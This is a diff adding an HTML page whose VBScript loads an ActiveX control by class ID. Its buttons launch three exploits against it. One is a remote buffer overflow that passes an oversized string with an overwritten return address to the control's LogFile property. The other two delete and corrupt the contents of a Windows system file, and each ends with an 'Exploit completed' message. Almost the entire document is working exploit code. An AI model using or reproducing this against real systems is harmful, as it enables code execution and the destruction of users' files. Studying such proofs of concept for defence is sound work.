@@ -1,0 +1,35 @@
+&lt;object classid=&#039;clsid:7600707B-9F47-416D-8AB5-6FD96EA37968&#039; id=&#039;test&#039; width=&#039;20&#039; height=&#039;20&#039;&gt;&lt;/object&gt;
+
+&lt;input language=VBScript onclick=bof() type=button value=&#039;Click here to start the Remote Buffer Overflow test&#039; style=&quot;width: 361px; height: 24px&quot; size=21&gt;
+
+&lt;input language=VBScript onclick=afd() type=button value=&#039;Click here to start the File Content Deletion test&#039; style=&quot;width: 361px; height: 24px&quot; size=21&gt;
+
+&lt;input language=VBScript onclick=afc() type=button value=&#039;Click here to start the File Content Corruption test&#039; style=&quot;width: 361px; height: 24px&quot; size=21&gt;
+
+
+&lt;script language=&#039;vbscript&#039;&gt;
+ Sub bof
+  buff = String(256,&quot;A&quot;) 
+  EDI  = unescape(&quot;BBBB&quot;) 
+  ESI  = unescape(&quot;CCCC&quot;)
+  EBX  = unescape(&quot;DDDD&quot;) 
+  EIP  = unescape(&quot;%C6%91%3A%7E&quot;) &#039;unescape(&quot;EEEE&quot;) 
+  buf2 = unescape(&quot;FFFFFFFFFFFFFFFFFFFF&quot;) 
+  memo = unescape(&quot;%00%00%01%00&quot;) 
+  rest = unescape(&quot;GGGG&quot;) + String(2000, &quot;H&quot;)
+  egg = buff + EDI + ESI + EBX + EIP + buf2 + memo + rest
+  test.LogFile = egg
+ End Sub
+
+ Sub afd
+  test.LogFile = &quot;C:\WINDOWS\_system.ini&quot;
+  test.ClearLogFile
+  MsgBox &quot;Exploit completed...&quot;
+ End Sub
+
+ Sub afc
+  test.SaveToFile &quot;C:\WINDOWS\_system.ini&quot;
+  MsgBox &quot;Exploit completed...&quot;
+ End Sub
+&lt;/script&gt;
+
